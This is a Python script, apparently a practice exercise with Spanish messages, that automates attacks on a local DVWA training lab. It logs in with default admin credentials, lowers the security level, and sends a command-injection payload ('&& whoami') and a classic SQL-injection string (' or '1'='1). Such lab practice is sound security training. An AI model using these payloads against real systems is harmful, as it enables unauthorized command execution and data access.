from bs4 import BeautifulSoup
import requests
import time


class DVWAExploit:
    token = ''
    credentials: dict = {'username': '', 'password': '',  'Login': 'Login',  'user_token': ''}
    login_retried: bool = False
    user: str = ''
    password: str = ''
    security_level: str = ''

    def __init__(self, url):
        try:
            self.url_login = url
            self.session = requests.Session()

            self.response = self.session.get(url)
            self.status = self.response.status_code

            # If url is available and there is not a bad response
            if self.status not in range(400, 503):
                self.connection = True
                self.__get_source()
                self.cookies = self.session.cookies.get_dict()
            else:
                self.connection = False
                print(f'Imposible acceder a la URL {url}\n\tStatus code: ', self.status)
        except Exception as e:
            self.connection = False
            print(f'Error en acceso a URL {url}\n\tError: {e}')

    def __get_source(self):
        # Extract page source
        src = self.response.content
        self.url = self.response.url
        self.soup = BeautifulSoup(src, 'html.parser')
        # self.__get_token()

    def __get_token(self):
        # From page source localize the user_token field
        self.token = self.soup.find('input', {'type': 'hidden'})['value']

    def login(self, user, password):
        self.user = user
        self.password = password
        self.__get_source()
        self.__get_token()

        if self.token:
            print('Accediendo...')
            self.credentials['username'] = user
            self.credentials['password'] = password
            self.credentials['user_token'] = self.token

            # Perform a POST into the url with parameters from "HTML Form URL Encoded"
            self.response = self.session.post(url=self.url_login, cookies=self.cookies, data=self.credentials)
            self.__get_source()

            # Find in webpage source 'class' with name 'message' in 'div' labels and get the value from that
            try:
                login_message = self.soup.find('div', {'class': 'message'}).string
            except Exception as e:
                login_message = None

            # Check login_message and avoid to not be logged if we need to Create/Reset Database on first DVWA access
            if not login_message and not self.login_retried:
                print('Creando database por primer acceso a DVWA...')
                self.__login_retry()
            else:
                print(login_message)

    def __login_retry(self):
        self.login_retried = True
        self.__get_source()
        self.__get_token()

        credentials_retry = {
            'create_db': 'Create / Reset Database',
            'user_token': self.token
        }

        # Perform retry POST and Disable retry
        self.response = self.session.post(url=self.url, cookies=self.cookies, data=credentials_retry)
        time.sleep(5)

        # Reset source parameters and login
        self.response = self.session.get(self.response.url)
        self.__get_source()
        self.__get_token()

        self.login(self.user, self.password)

    def set_security_level(self, url, level):
        """
        :param url:
        :param level: low; medium; high; impossible
        :return:
        """
        self.security_level = level
        self.response = self.session.get(url)
        self.__get_source()
        self.__get_token()

        # Perform POST to change the security model
        credentials = {'security': str(level.lower()), 'seclev_submit': 'Submit', 'user_token': self.token}
        self.session.post(url, cookies=self.cookies, data=credentials)
        self.response = self.session.get(url)
        self.__get_source()

        sec_lev = self.soup.find_all('em')[0].string
        print(f'Nivel de seguridad fijado como "{sec_lev}"')

    def os_commanding(self, url, command):
        # Perform POST with command
        credentials = {'ip': command, 'Submit': 'Submit'}
        self.response = self.session.post(url, cookies=self.cookies, data=credentials)
        # self.response = self.session.get(url)

        # Get result source
        self.__get_source()
        print(self.soup.find('pre').string)

    def sql_injection(self, url, query):
        # This injection result from a GET method from the url path. Due to that, we must join the path and query
        # Credentials
        submit = '&Submit=Submit'
        url = str(url) + str(query) + str(submit)

        # Perform GET command
        self.response = self.session.get(url, cookies=self.cookies)
        self.__get_source()

        sql_res = self.soup.find_all('pre')
        for res in sql_res:
            print(res.extract())


if __name__ == '__main__':
    page = DVWAExploit('http://127.0.0.1:8083/login.php')

    if page.connection:
        print('1-\tAcceso a DVWA.')
        page.login('admin', 'password')
        print(50 * '=')
        print('2-\tCambio de nivel de seguridad. ')
        page.set_security_level('http://127.0.0.1:8083/security.php', 'medium')
        page.set_security_level('http://127.0.0.1:8083/security.php', 'low')
        print(50*'=')
        print('3-\tVulnerabilidad OS Commanding')
        page.os_commanding('http://127.0.0.1:8083/vulnerabilities/exec/',
                           '8.8.8.8 && echo COMANDO MALICIOSO && whoami')
        print(50*'=')
        print('4-\tVulnerabilidad SQL Injection')
        page.sql_injection('http://127.0.0.1:8083/vulnerabilities/sqli/?',
                           "id=1' or '1'='1")

